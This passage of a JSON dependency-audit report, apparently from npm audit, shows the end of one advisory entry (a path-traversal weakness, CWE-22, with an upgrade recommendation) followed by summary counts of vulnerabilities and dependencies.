      "recommendation": "Upgrade to version 7.5.3 or later",
      "patched_versions": ">=7.5.3",
      "updated": "2026-01-16T21:16:24.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-22"
      ],
      "url": "https://github.com/advisories/GHSA-8qq5-rm4j-mr97"
    }
  },
  "muted": [],
  "metadata": {
    "vulnerabilities": {
      "info": 0,
      "low": 2,
      "moderate": 2,
      "high": 5,
      "critical": 0
    },
    "dependencies": 1747,
    "devDependencies": 0,
    "optionalDependencies": 0,
    "totalDependencies": 1747
  }
}
